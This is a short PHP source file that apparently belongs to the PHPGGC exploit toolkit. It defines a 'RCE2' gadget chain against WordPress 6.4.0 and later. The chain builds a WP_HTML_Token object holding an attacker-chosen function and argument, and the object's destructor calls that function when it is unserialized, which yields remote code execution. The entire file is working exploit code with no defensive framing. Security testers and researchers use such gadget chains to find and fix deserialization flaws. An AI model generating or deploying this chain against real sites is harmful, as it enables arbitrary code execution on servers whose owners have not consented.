<?php

namespace GadgetChain\WordPress;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '6.4.0+';
    public static $vector = '__destruct';
    public static $author = 'Fenrisk (Szlam)';
    public static $information = '';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \WP_HTML_Token($parameter, $function);
    }
}
